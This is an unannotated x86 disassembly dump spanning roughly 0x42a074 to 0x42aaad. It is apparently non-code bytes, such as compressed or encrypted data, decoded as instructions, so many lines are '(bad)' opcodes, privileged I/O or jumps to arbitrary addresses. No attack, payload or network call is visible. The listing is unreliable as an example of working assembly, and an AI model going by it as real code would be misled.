  42a074:	out    0x4,eax
  42a076:	mov    ds:0x5b09bd5e,eax
  42a07b:	ins    BYTE PTR es:[edi],dx
  42a07c:	mov    dh,0xb9
  42a07e:	dec    esi
  42a07f:	setns  BYTE PTR [edi+edi*2+0x3d]
  42a084:	lds    eax,FWORD PTR [edi]
  42a086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a087:	pop    esi
  42a088:	and    DWORD PTR [esi],esi
  42a08a:	ins    DWORD PTR es:[edi],dx
  42a08b:	fiadd  DWORD PTR [edi+0x61935aab]
  42a091:	popa   
  42a092:	sub    eax,0xe993a9a7
  42a097:	lea    edx,cs:[ecx-0x7a56fe78]
  42a09e:	retf   0x975c
  42a0a1:	loop   0x42a05c
  42a0a3:	jmp    0x2f32:0xdeb49374
  42a0aa:	push   DWORD PTR [edx]
  42a0ac:	les    ecx,FWORD PTR [eax+0x33cc5d73]
  42a0b2:	in     al,dx
  42a0b3:	mov    esp,0xc6c51859
  42a0b8:	mov    cl,0xcf
  42a0ba:	cmp    BYTE PTR [ecx+0x21],dl
  42a0bd:	fstp   TBYTE PTR [ecx]
  42a0bf:	shr    BYTE PTR [eax],cl
  42a0c1:	imul   eax,DWORD PTR [eax+0x55c2add7],0xffffffd1
  42a0c8:	in     eax,dx
  42a0c9:	sbb    ecx,esi
  42a0cb:	stc    
  42a0cc:	xor    DWORD PTR [esi+0x67],esi
  42a0cf:	adc    al,0x1c
  42a0d1:	cmp    ch,ch
  42a0d3:	mov    BYTE PTR [edx],dl
  42a0d5:	sti    
  42a0d6:	fs aad 0x1a
  42a0d9:	sbb    al,0xb3
  42a0db:	adc    eax,0x555a5c04
  42a0e0:	(bad)  
  42a0e1:	jmp    0x7734ea97
  42a0e6:	pop    esp
  42a0e7:	xchg   edx,eax
  42a0e8:	jmp    0x4694c8c4
  42a0ed:	test   DWORD PTR [eax],0x0
	...
  42a153:	add    BYTE PTR [eax],al
  42a155:	add    bh,dl
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	(bad)  
  42a162:	cld    
  42a163:	outs   dx,BYTE PTR ds:[esi]
  42a164:	push   esi
  42a165:	push   edx
  42a166:	addr16 ret 
  42a168:	add    DWORD PTR [eax],eax
  42a16a:	add    BYTE PTR [ecx],al
  42a16c:	add    BYTE PTR [eax],al
  42a16e:	sub    DWORD PTR [edx-0x71cb61ee],0xffffff92
  42a175:	and    DWORD PTR [edi+0x3f],esp
  42a178:	push   eax
  42a179:	inc    ecx
  42a17a:	xor    ebp,DWORD PTR [esi-0x4d]
  42a17d:	cmp    DWORD PTR [ecx+edx*2+0xa52ed55],eax
  42a184:	sbb    DWORD PTR [esi+0x391a4b59],eax
  42a18a:	int    0xae
  42a18c:	(bad)  
  42a18d:	cmp    cl,BYTE PTR [ecx-0x36ea684f]
  42a193:	adc    BYTE PTR [ebx-0x1c],al
  42a196:	xor    ecx,esp
  42a198:	hlt    
  42a199:	fmul   st,st(4)
  42a19b:	xchg   ecx,eax
  42a19c:	xor    DWORD PTR [esi],ebp
  42a19e:	inc    esi
  42a19f:	jb     0x42a125
  42a1a1:	cmp    BYTE PTR [esi+eiz*2-0x42ca961],dl
  42a1a8:	ss cmc 
  42a1aa:	repz mov dh,0xac
  42a1ad:	sbb    eax,0x26588d05
  42a1b2:	ror    ah,0x8a
  42a1b5:	test   al,0x1f
  42a1b7:	mov    dl,0x8f
  42a1b9:	stc    
  42a1ba:	cmp    BYTE PTR [esp+ebx*1],0x6a
  42a1be:	pop    ebx
  42a1bf:	or     DWORD PTR [eax+0x4aac1b4f],0xffffffed
  42a1c6:	mov    ch,0x69
  42a1c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a1c9:	rcr    DWORD PTR [edi+0x63],0x68
  42a1cd:	sub    al,0x4d
  42a1cf:	push   ecx
  42a1d0:	inc    BYTE PTR [esi+0x109974ee]
  42a1d6:	mov    BYTE PTR [ebx+0x1314826a],al
  42a1dc:	or     BYTE PTR [edx-0x46],al
  42a1df:	lods   eax,DWORD PTR ds:[esi]
  42a1e0:	xor    BYTE PTR [eax],cl
  42a1e2:	sub    BYTE PTR [edi-0x78],ah
  42a1e5:	pop    edi
  42a1e6:	add    bl,BYTE PTR [edx]
  42a1e8:	popf   
  42a1e9:	mov    ebx,DWORD PTR [eax+0x47]
  42a1ec:	ret    
  42a1ed:	es jns 0x42a240
  42a1f0:	xlat   BYTE PTR fs:[ebx]
  42a1f2:	aaa    
  42a1f3:	outs   dx,DWORD PTR ds:[esi]
  42a1f4:	inc    ebp
  42a1f5:	inc    ebx
  42a1f6:	xor    ah,BYTE PTR [ecx]
  42a1f8:	cmc    
  42a1f9:	loopne 0x42a1f7
  42a1fb:	aas    
  42a1fc:	jb     0x42a247
  42a1fe:	jno    0x42a1dc
  42a200:	sub    ecx,esi
  42a202:	and    bl,bh
  42a204:	jg     0x42a1dd
  42a206:	mov    ebp,0xefc76899
  42a20b:	out    dx,al
  42a20c:	pop    edi
  42a20d:	imul   ebx,DWORD PTR [eax+0x2c4d5c29],0xb7d17439
  42a217:	daa    
  42a218:	test   al,0x32
  42a21a:	lock mov BYTE PTR [edx],ch
  42a21d:	pop    edi
  42a21e:	dec    ecx
  42a21f:	xchg   ebp,eax
  42a220:	(bad)  
  42a221:	out    dx,eax
  42a222:	push   ecx
  42a223:	inc    esp
  42a224:	xor    DWORD PTR [ebp+0x2b],esi
  42a227:	int3   
  42a228:	ror    BYTE PTR [edi-0x4da946f6],0x80
  42a22f:	adc    al,0x58
  42a231:	cmp    al,0x24
  42a233:	mov    ecx,ecx
  42a235:	or     ebp,DWORD PTR [ebx+esi*4]
  42a238:	add    al,BYTE PTR [ebx+0x62216ed6]
  42a23e:	push   ds
  42a23f:	fs cmp eax,0x17a56969
  42a245:	and    ebx,DWORD PTR [ecx+0x654f6a70]
  42a24b:	pushf  
  42a24c:	retf   
  42a24d:	jns    0x42a1e1
  42a24f:	es or  eax,0x857bbe02
  42a255:	fucomip st,st(3)
  42a257:	aas    
  42a258:	xor    DWORD PTR [edi+ebp*1],edx
  42a25b:	xchg   ebx,eax
  42a25c:	gs xchg ebp,eax
  42a25e:	call   0x7135c63a
  42a263:	loop   0x42a1ee
  42a265:	out    0x84,al
  42a267:	push   ss
  42a268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a269:	dec    esp
  42a26a:	ins    DWORD PTR es:[edi],dx
  42a26b:	ss sti 
  42a26d:	jae    0x42a26f
	...
  42a2d3:	add    BYTE PTR [eax],al
  42a2d5:	add    BYTE PTR [ebx],ch
  42a2d7:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	fnstenv [edx]
  42a2e3:	(bad)  
  42a2e5:	loopne 0x42a34e
  42a2e7:	les    eax,FWORD PTR [ecx]
  42a2e9:	add    BYTE PTR [eax],al
  42a2eb:	add    DWORD PTR [eax],eax
  42a2ed:	add    bl,dl
  42a2ef:	jle    0x42a2fb
  42a2f1:	push   ds
  42a2f2:	stc    
  42a2f3:	dec    edi
  42a2f4:	add    DWORD PTR [ebx],0xffffffd7
  42a2f7:	sar    DWORD PTR [ebp-0x36],0x40
  42a2fb:	jns    0x42a2fc
  42a2fd:	mov    cl,0x3f
  42a2ff:	dec    BYTE PTR [ecx]
  42a301:	jle    0x42a32f
  42a303:	shr    ecx,0x63
  42a306:	sahf   
  42a307:	retf   0xf3ec
  42a30a:	sub    eax,0x572757f7
  42a30f:	pop    edx
  42a310:	push   edx
  42a311:	xor    eax,0x783ac75a
  42a316:	cs xor ch,al
  42a319:	sub    esi,edx
  42a31b:	lods   al,BYTE PTR ds:[esi]
  42a31c:	loope  0x42a2cb
  42a31e:	pop    eax
  42a31f:	and    eax,0xef9ad525
  42a324:	stos   BYTE PTR es:[edi],al
  42a325:	out    0xec,eax
  42a327:	add    ebp,ecx
  42a329:	or     edx,esp
  42a32b:	cdq    
  42a32c:	push   0x3adbc68c
  42a331:	jmp    0x42a33b
  42a333:	loopne 0x42a2d8
  42a335:	popa   
  42a336:	rol    DWORD PTR [ecx+0x43],0x1d
  42a33a:	inc    edi
  42a33b:	sbb    DWORD PTR [ecx-0x39],esi
  42a33e:	or     esi,eax
  42a340:	dec    edi
  42a341:	nop
  42a342:	mov    bl,0x82
  42a344:	out    0x31,al
  42a346:	pop    edx
  42a347:	cmp    ebp,DWORD PTR [eax]
  42a349:	sub    al,0x87
  42a34b:	sti    
  42a34c:	pop    esi
  42a34d:	jle    0x42a380
  42a34f:	or     eax,0xa794d22a
  42a354:	iret   
  42a355:	lea    ebx,[ecx-0xf9f1427]
  42a35b:	test   DWORD PTR [esi+0x5a],0x477c88b8
  42a362:	int3   
  42a363:	adc    dh,BYTE PTR [esi-0x14]
  42a366:	jo     0x42a394
  42a368:	cwde   
  42a369:	mov    ebx,esi
  42a36b:	repnz adc dl,BYTE PTR [ecx]
  42a36e:	fwait
  42a36f:	mov    cl,0x60
  42a371:	test   al,0x9a
  42a373:	or     eax,0x5eca730b
  42a378:	test   DWORD PTR [eax+0x3861088b],esp
  42a37e:	stos   DWORD PTR es:[edi],eax
  42a37f:	mov    ecx,0x4097d3ca
  42a384:	pop    ebx
  42a385:	imul   esp,DWORD PTR [ecx-0x5687591],0x7f9cd3f5
  42a38f:	pusha  
  42a390:	pushf  
  42a391:	mov    dh,0xe6
  42a393:	cmp    ecx,DWORD PTR [edx]
  42a395:	out    0x6,al
  42a397:	imul   ebp,DWORD PTR [edi-0x3fb0dd7c],0xc32b0f01
  42a3a1:	pushf  
  42a3a2:	mov    edx,0xdbcee336
  42a3a7:	(bad)  
  42a3a8:	into   
  42a3a9:	(bad)  
  42a3aa:	(bad)  
  42a3ab:	pusha  
  42a3ac:	push   ds
  42a3ad:	sti    
  42a3ae:	add    al,0xf9
  42a3b0:	in     eax,0x78
  42a3b2:	and    ah,ah
  42a3b4:	and    ebx,DWORD PTR [edx]
  42a3b6:	cli    
  42a3b7:	mov    ecx,0x9b826349
  42a3bc:	dec    ebp
  42a3bd:	pop    ss
  42a3be:	pushf  
  42a3bf:	mov    eax,ebp
  42a3c1:	sub    eax,0x8a5629cd
  42a3c6:	adc    al,ah
  42a3c8:	jo     0x42a37f
  42a3ca:	scas   al,BYTE PTR es:[edi]
  42a3cb:	and    al,0x2d
  42a3cd:	xor    eax,DWORD PTR [ebp+0x30]
  42a3d0:	sub    DWORD PTR [edx+0x2],ecx
  42a3d3:	inc    ecx
  42a3d4:	adc    ecx,DWORD PTR ds:0xc3cb9c77
  42a3da:	jecxz  0x42a3df
  42a3dc:	cld    
  42a3dd:	gs iret 
  42a3df:	and    bl,dl
  42a3e1:	xor    eax,0x993edea0
  42a3e6:	pop    ds
  42a3e7:	pushf  
  42a3e8:	popa   
  42a3e9:	xchg   edi,eax
  42a3ea:	outs   dx,DWORD PTR ds:[esi]
  42a3eb:	jbe    0x42a44d
  42a3ed:	js     0x42a3ef
	...
  42a453:	add    BYTE PTR [eax],al
  42a455:	add    BYTE PTR [edi+0xe],bh
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0x4ede8f3d
  42a465:	and    eax,0x1c567
  42a46a:	add    BYTE PTR [ecx],al
  42a46c:	add    BYTE PTR [eax],al
  42a46e:	mov    edx,0xbfde2f54
  42a473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a474:	retf   0x2bf7
  42a477:	je     0x42a43a
  42a479:	fmul   DWORD PTR [edx+0x22f0a59f]
  42a47f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a480:	inc    ebp
  42a481:	pop    eax
  42a482:	addr16 repnz repnz push es
  42a486:	jl     0x42a4e3
  42a488:	aad    0x88
  42a48a:	ret    0xd709
  42a48d:	in     eax,0x2
  42a48f:	std    
  42a490:	psrlq  mm4,QWORD PTR [edx+edx*1]
  42a494:	push   ecx
  42a495:	and    edi,DWORD PTR [eax+0x3352fe0]
  42a49b:	std    
  42a49c:	das    
  42a49d:	inc    edi
  42a49e:	or     eax,esi
  42a4a0:	aad    0xe7
  42a4a2:	adc    BYTE PTR [edx+0x4798e3ac],dh
  42a4a8:	dec    ebx
  42a4a9:	or     esp,DWORD PTR [ecx+edi*4]
  42a4ac:	or     al,0xa1
  42a4ae:	sahf   
  42a4af:	mov    DWORD PTR [ebx-0x2a2628a],ebx
  42a4b5:	out    dx,al
  42a4b6:	mov    dh,BYTE PTR [edx]
  42a4b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4b9:	jmp    0x42a444
  42a4bb:	xchg   ecx,eax
  42a4bc:	xchg   BYTE PTR [ecx-0x21],dh
  42a4bf:	retf   
  42a4c0:	test   al,0xb
  42a4c2:	daa    
  42a4c3:	xchg   eax,ebx
  42a4c5:	arpl   WORD PTR [esi],bx
  42a4c7:	xor    DWORD PTR [ecx+eiz*4+0x256d14c4],edx
  42a4ce:	out    dx,eax
  42a4cf:	dec    ebx
  42a4d0:	(bad)  
  42a4d1:	rcl    BYTE PTR [eax-0x6d],1
  42a4d4:	and    DWORD PTR [ebp-0x4c],ecx
  42a4d7:	mov    edi,0xa509a053
  42a4dc:	xlat   BYTE PTR ds:[ebx]
  42a4dd:	jnp    0x42a4e1
  42a4df:	mov    BYTE PTR [ebp-0x33dd3746],bh
  42a4e5:	mov    gs,WORD PTR [ecx+0x34]
  42a4e8:	mov    ebx,ds
  42a4ea:	pop    ecx
  42a4eb:	fyl2x  
  42a4ed:	pop    ebx
  42a4ee:	cmp    al,0x26
  42a4f0:	sti    
  42a4f1:	repz stc 
  42a4f3:	sbb    BYTE PTR [eax-0x3c],0xdf
  42a4f7:	call   0xb181cfa2
  42a4fc:	push   ecx
  42a4fd:	mov    ecx,0x76b888d0
  42a502:	outs   dx,DWORD PTR ds:[esi]
  42a503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a504:	mov    dh,dh
  42a506:	test   BYTE PTR [ebx+0x6f],ah
  42a509:	repz cmp ah,BYTE PTR [esi+0x5]
  42a50d:	xor    eax,DWORD PTR [ebx-0x41bb5b80]
  42a513:	cmp    cl,BYTE PTR [esi+0x4bf6e645]
  42a519:	fist   DWORD PTR [ebp-0x155d360a]
  42a51f:	stos   BYTE PTR es:[edi],al
  42a520:	cmc    
  42a521:	fistp  QWORD PTR [ebx-0x47]
  42a524:	or     al,0x98
  42a526:	mov    al,0xc7
  42a528:	xchg   ecx,eax
  42a529:	imul   BYTE PTR [eax+0x4f]
  42a52c:	je     0x42a50d
  42a52e:	sub    ebp,DWORD PTR [esp+edx*2]
  42a531:	cmp    eax,0x22cd78e8
  42a536:	or     BYTE PTR [edi+0x30e0e2af],al
  42a53c:	jmp    0x42a5bc
  42a53e:	and    eax,0xf94fbd74
  42a543:	sar    BYTE PTR [eax+0x1d],0x4
  42a547:	scas   eax,DWORD PTR es:[edi]
  42a548:	gs and eax,0x6f47bf2f
  42a54e:	in     eax,dx
  42a54f:	cs inc esi
  42a551:	js     0x42a519
  42a553:	mov    al,ds:0xdf9a812a
  42a558:	dec    DWORD PTR [ebp+0x115e952a]
  42a55e:	pop    ebp
  42a55f:	fs test ah,al
  42a562:	hlt    
  42a563:	jb     0x42a5c9
  42a565:	add    esp,esp
  42a567:	shr    DWORD PTR [ecx-0x59],0x6c
  42a56b:	enter  0x193d,0x0
	...
  42a5d3:	add    BYTE PTR [eax],al
  42a5d5:	add    BYTE PTR [eax],bl
  42a5d7:	dec    edi
  42a5d8:	pop    ss
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0xaa23389f
  42a5e5:	(bad)  
  42a5e6:	mov    BYTE PTR [bx+di],0x0
  42a5ea:	add    BYTE PTR [ecx],al
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	leave  
  42a5ef:	mov    eax,0xefb1c799
  42a5f4:	std    
  42a5f5:	(bad)  
  42a5f6:	and    BYTE PTR ds:0x28eee42a,0x3a
  42a5fd:	pop    esi
  42a5fe:	scas   al,BYTE PTR es:[edi]
  42a5ff:	adc    BYTE PTR [ebp+0x7b82ce12],0x5f
  42a606:	(bad)  
  42a607:	and    bl,bh
  42a609:	fwait
  42a60a:	clc    
  42a60b:	shr    DWORD PTR [esi+0x59],0x80
  42a60f:	loop   0x42a5d4
  42a611:	int    0x21
  42a613:	shl    bl,1
  42a615:	jno    0x42a679
  42a617:	add    eax,0xabc8534c
  42a61c:	cmp    ch,BYTE PTR [eax]
  42a61e:	jg     0x42a698
  42a620:	sub    al,0x98
  42a622:	jbe    0x42a66f
  42a624:	or     eax,0xd04bc6d4
  42a629:	sbb    DWORD PTR [esi+0x5701a028],edx
  42a62f:	lock push es
  42a631:	(bad)  
  42a632:	shr    DWORD PTR [ecx+0x133b55f5],1
  42a638:	add    esp,DWORD PTR [ebx+0xdb6aa5f]
  42a63e:	enter  0x2457,0xe2
  42a642:	sub    al,0x8a
  42a644:	in     eax,dx
  42a645:	fisttp WORD PTR [esi+0x1e296b6c]
  42a64b:	adc    DWORD PTR [eax+ebx*2],ebp
  42a64e:	cli    
  42a64f:	mov    esi,0x4513680b
  42a654:	cdq    
  42a655:	add    ebx,DWORD PTR [esi]
  42a657:	sbb    esp,DWORD PTR [edx-0x4ef7b01]
  42a65d:	(bad)
  42a660:	pop    ss
  42a661:	hlt    
  42a662:	out    0x4b,al
  42a664:	sar    bl,cl
  42a666:	das    
  42a667:	loope  0x42a62b
  42a669:	dec    edx
  42a66a:	lock push 0x6b079f4
  42a670:	nop
  42a671:	and    edi,edx
  42a673:	cwde   
  42a674:	pop    ecx
  42a675:	cmp    eax,0x9864a14e
  42a67a:	jmp    0x56bfd72d
  42a67f:	ins    DWORD PTR es:[edi],dx
  42a680:	test   BYTE PTR [esi+0x4e],dh
  42a683:	mov    BYTE PTR [eax],ch
  42a685:	add    eax,0x860615ae
  42a68a:	addr16 test al,0x4d
  42a68d:	and    cl,BYTE PTR [esi+esi*4+0x8]
  42a691:	clc    
  42a692:	push   edi
  42a693:	imul   edi,ebp,0xb703b3f7
  42a699:	icebp  
  42a69a:	xchg   ebp,eax
  42a69b:	mov    ds:0x71063173,eax
  42a6a0:	(bad)  
  42a6a1:	push   ecx
  42a6a2:	sbb    al,BYTE PTR [eax]
  42a6a4:	arpl   WORD PTR [ebx],dx
  42a6a6:	push   edi
  42a6a7:	inc    esi
  42a6a8:	cmp    al,0x68
  42a6aa:	inc    edx
  42a6ab:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42a6ad:	jmp    0x42a631
  42a6af:	mov    DWORD PTR ss:[edi-0x1ada3fac],ebp
  42a6b6:	inc    eax
  42a6b7:	call   0x835e:0x884523c
  42a6be:	(bad)  
  42a6bf:	repnz into 
  42a6c1:	pop    es
  42a6c2:	push   0xffffffa3
  42a6c4:	ret    0xb1e6
  42a6c7:	and    cl,BYTE PTR [edx-0x71ab6a7d]
  42a6cd:	pop    edx
  42a6ce:	mov    bh,0xb8
  42a6d0:	push   edi
  42a6d1:	add    eax,0xaea74de6
  42a6d6:	test   BYTE PTR [ebx+esi*8],dh
  42a6d9:	in     eax,dx
  42a6da:	mov    cl,0x93
  42a6dc:	jmp    0x536862fc
  42a6e1:	cwde   
  42a6e2:	not    DWORD PTR [edx-0x2d]
  42a6e5:	fnstcw WORD PTR [ebx+0x5d]
  42a6e8:	lock add al,BYTE PTR [ebx+0x6c]
  42a6ec:	cs xchg edx,eax
	...
  42a756:	and    al,0x16
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi-0x3647ece4],0x679e11b9
  42a767:	mov    DWORD PTR [ecx],0x10000
  42a76d:	add    BYTE PTR [edx],dl
  42a76f:	jecxz  0x42a785
  42a771:	and    ebp,DWORD PTR [eax-0x3d]
  42a774:	sbb    BYTE PTR [eax+0x7b2f4b8],ah
  42a77a:	and    esp,DWORD PTR [eax-0x57be34db]
  42a780:	mov    edi,DWORD PTR [ebp-0x1ef8b733]
  42a786:	inc    ebx
  42a787:	daa    
  42a788:	into   
  42a789:	inc    ebp
  42a78a:	out    0x53,eax
  42a78c:	je     0x42a7f5
  42a78e:	rcl    BYTE PTR [ecx+0x5d],0xd8
  42a792:	(bad)  
  42a793:	cld    
  42a794:	(bad)  
  42a795:	jg     0x42a7e0
  42a797:	not    BYTE PTR [ebx+0x3c2bfc0c]
  42a79d:	adc    BYTE PTR [edi],cl
  42a79f:	mov    esp,0x5b3cfc0b
  42a7a4:	nop
  42a7a5:	ins    DWORD PTR es:[edi],dx
  42a7a6:	clc    
  42a7a7:	add    ch,BYTE PTR [edx]
  42a7a9:	fld    DWORD PTR [esi-0x4d2e8985]
  42a7af:	inc    ebx
  42a7b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7b1:	mov    edi,0x74233b18
  42a7b6:	outs   dx,DWORD PTR ds:[esi]
  42a7b7:	data16 jne 0x42a797
  42a7ba:	mov    al,ds:0x4cdcbb6d
  42a7bf:	idiv   eax
  42a7c1:	shr    DWORD PTR [esi],0x55
  42a7c4:	push   edx
  42a7c5:	xor    eax,0x17747814
  42a7ca:	enter  0xf96a,0x10
  42a7ce:	xor    edx,DWORD PTR [eax-0x2113445a]
  42a7d4:	jge    0x42a7f2
  42a7d6:	xor    BYTE PTR [eax],ch
  42a7d8:	cwde   
  42a7d9:	das    
  42a7da:	pop    eax
  42a7db:	jge    0x42a796
  42a7dd:	xor    al,0x2f
  42a7df:	test   eax,0x43e1273f
  42a7e4:	aas    
  42a7e5:	test   DWORD PTR [eax+0xb2be678],ebx
  42a7eb:	mov    edx,0xb083add5
  42a7f0:	fwait
  42a7f1:	jbe    0x42a83d
  42a7f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7f4:	inc    edx
  42a7f5:	mov    ecx,0x567eee99
  42a7fa:	mov    ebp,0x1d261784
  42a7ff:	sbb    edi,ebx
  42a801:	in     al,0xc9
  42a803:	or     DWORD PTR [esi],esi
  42a805:	lahf   
  42a806:	mov    edx,0xa9bc8f58
  42a80b:	add    ecx,DWORD PTR [edx+0x294233b4]
  42a811:	or     BYTE PTR [esi+0x53],0xac
  42a815:	sub    eax,0xcbc40ed8
  42a81a:	jmp    0x5e39:0x38f72b7b
  42a821:	mov    al,0xa8
  42a823:	pop    ebp
  42a824:	sub    eax,0x1660fb4d
  42a829:	push   si
  42a82b:	retf   0x2c36
  42a82e:	sub    bl,BYTE PTR [ecx-0x37]
  42a831:	push   cs
  42a832:	jae    0x42a826
  42a834:	xchg   edx,eax
  42a835:	psrad  mm6,mm7
  42a838:	lahf   
  42a839:	or     eax,0x8176a857
  42a83e:	mov    dl,0x23
  42a840:	in     eax,dx
  42a841:	push   eax
  42a842:	dec    edi
  42a843:	(bad)
  42a847:	je     0x42a856
  42a849:	in     eax,0x23
  42a84b:	mov    ds:0x776dae72,al
  42a850:	adc    BYTE PTR [edi-0x45],bl
  42a853:	xchg   ecx,eax
  42a854:	jnp    0x42a8bf
  42a856:	mov    dh,0x8a
  42a858:	dec    ecx
  42a859:	pop    fs
  42a85b:	aad    0x41
  42a85d:	sbb    bl,cl
  42a85f:	pusha  
  42a860:	mov    cl,0xc2
  42a862:	xor    eax,0x4e5ce689
  42a867:	adc    DWORD PTR [edi+0x23],0x1f
  42a86b:	jecxz  0x42a831
  42a86d:	push   ss
	...
  42a8d6:	mov    ah,BYTE PTR [ebp+0x63]
  42a8d9:	mov    edi,0x75debfef
  42a8de:	add    ebp,0x35656c97
  42a8e4:	dec    ecx
  42a8e5:	jmp    0x100:0x1c867
  42a8ec:	add    BYTE PTR [eax],al
  42a8ee:	mov    dh,0x76
  42a8f0:	(bad)  
  42a8f1:	mov    al,0x3e
  42a8f3:	ror    BYTE PTR ds:0x5b7fdd70,cl
  42a8f9:	bound  ebp,QWORD PTR [edi+edi*2]
  42a8fc:	imul   BYTE PTR [eax+0x38]
  42a8ff:	cwde   
  42a900:	cs mov bh,0x41
  42a903:	ss inc ebp
  42a905:	dec    ebx
  42a906:	mov    esp,0x995b2c45
  42a90b:	add    DWORD PTR [ebx],edi
  42a90d:	dec    esp
  42a90e:	xchg   ebp,eax
  42a90f:	mov    edi,gs
  42a911:	hlt    
  42a912:	bound  eax,QWORD PTR [ecx+0x107d5acc]
  42a918:	outs   dx,BYTE PTR ds:[esi]
  42a919:	cmp    al,0x87
  42a91b:	gs jno 0x42a910
  42a91e:	jmp    0x6fcd8c2c
  42a923:	mov    cl,0xe2
  42a925:	sub    eax,0x8d65b8cb
  42a92a:	cmp    DWORD PTR [ecx+0x6ca78e99],esp
  42a930:	int    0xe3
  42a932:	(bad)  
  42a933:	jmp    0x42a8bd
  42a935:	js     0x42a94b
  42a937:	shl    DWORD PTR [edi-0x9],0x1c
  42a93b:	popf   
  42a93c:	sti    
  42a93d:	cli    
  42a93e:	mov    dh,0xaf
  42a940:	stc    
  42a941:	cmp    al,0x2
  42a943:	js     0x42a8ee
  42a945:	imul   esp,DWORD PTR [ebx-0x5df611e9],0x6c
  42a94c:	adc    DWORD PTR [esi],ebp
  42a94e:	inc    ecx
  42a94f:	add    ch,ch
  42a951:	jg     0x42a927
  42a953:	jae    0x42a9d1
  42a955:	out    dx,eax
  42a956:	jge    0x42a8e0
  42a958:	mov    ds:0x32797576,al
  42a95d:	scas   al,BYTE PTR es:[edi]
  42a95e:	mov    ds:0xe635349d,al
  42a963:	frstor [esp+eiz*2]
  42a966:	sub    BYTE PTR ds:0x30accba8,bh
  42a96c:	into   
  42a96d:	xchg   ebx,eax
  42a96e:	ds push eax
  42a970:	fs and ebp,0xffffff8a
  42a974:	inc    ah
  42a976:	(bad)  
  42a977:	xchg   esp,eax
  42a978:	mov    ebx,0xf3888e2a
  42a97d:	ficom  WORD PTR [ebp-0x12]
  42a980:	lahf   
  42a981:	mov    ecx,0x8757bfac
  42a986:	out    0xf8,al
  42a988:	inc    esi
  42a989:	mov    ch,0x36
  42a98b:	pop    ss
  42a98c:	mov    ds:0x52fb65d0,al
  42a991:	xor    DWORD PTR [edi-0x2c52ae54],eax
  42a997:	(bad)  
  42a998:	cmp    al,0xb3
  42a99a:	jnp    0x42aa12
  42a99c:	mov    ds:0xd94aad9c,al
  42a9a1:	adc    eax,0x38a53b68
  42a9a6:	mov    ss,WORD PTR [ebx+ebp*1]
  42a9a9:	add    ebx,DWORD PTR [ebp+0x4e4a7e9b]
  42a9af:	aas    
  42a9b0:	(bad)  
  42a9b1:	pusha  
  42a9b2:	int    0x51
  42a9b4:	xchg   ah,ah
  42a9b6:	push   esp
  42a9b7:	daa    
  42a9b8:	test   eax,0x199e951a
  42a9bd:	aaa    
  42a9be:	in     al,dx
  42a9bf:	jle    0x42a989
  42a9c1:	fld    DWORD PTR [edi]
  42a9c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a9c4:	push   0x50
  42a9c6:	mov    bh,0x17
  42a9c8:	ror    BYTE PTR [eax+ebx*4],0xac
  42a9cc:	(bad)  
  42a9cd:	lods   eax,DWORD PTR ds:[esi]
  42a9ce:	int    0xdf
  42a9d0:	fldcw  WORD PTR [edx+esi*4]
  42a9d3:	hlt    
  42a9d4:	das    
  42a9d5:	aam    0x52
  42a9d7:	mov    ch,BYTE PTR [ebp+0x17f3435b]
  42a9dd:	shl    DWORD PTR [ebx+0x24],0xcf
  42a9e1:	xlat   BYTE PTR ds:[ebx]
  42a9e2:	rcr    DWORD PTR [ecx],cl
  42a9e4:	pop    ds
  42a9e5:	add    al,0xbb
  42a9e7:	sub    ebp,DWORD PTR [eax]
  42a9e9:	mov    ch,0xcc
  42a9eb:	xchg   ebp,eax
  42a9ec:	adc    eax,0x56
	...
  42aa55:	add    BYTE PTR [eax+0x3fee1d93],ch
  42aa5b:	out    dx,al
  42aa5c:	sti    
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	in     eax,dx
  42aa63:	mov    eax,0xc9672bb4
  42aa68:	add    DWORD PTR [eax],eax
  42aa6a:	add    BYTE PTR [ecx],al
  42aa6c:	add    BYTE PTR [eax],al
  42aa6e:	cwde   
  42aa6f:	pop    ss
  42aa70:	sbb    al,0xde
  42aa72:	stc    
  42aa73:	retf   0x6f3c
  42aa76:	outs   dx,DWORD PTR ds:[esi]
  42aa77:	dec    esi
  42aa78:	into   
  42aa79:	mov    ebx,0xd0b2362b
  42aa7e:	mov    ch,0xe7
  42aa80:	jae    0x42aaf7
  42aa82:	test   BYTE PTR [ebx],ah
  42aa84:	and    ch,ah
  42aa86:	in     al,0x3e
  42aa88:	mov    edx,0x48a6e4d9
  42aa8d:	cld    
  42aa8e:	imul   esi,DWORD PTR [ecx-0x54b351b0],0x566b93a4
  42aa98:	add    BYTE PTR [ecx+0x18],bh
  42aa9b:	cmc    
  42aa9c:	mov    ebx,0xf756d08c
  42aaa1:	(bad)  
  42aaa2:	xchg   edx,eax
  42aaa3:	or     edx,DWORD PTR [ebx]
  42aaa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aaa6:	aaa    
  42aaa7:	xchg   esp,eax
  42aaa8:	xchg   BYTE PTR [ecx-0x5f],dl
  42aaab:	mov    bl,0xc7
  42aaad:	dec    ebp
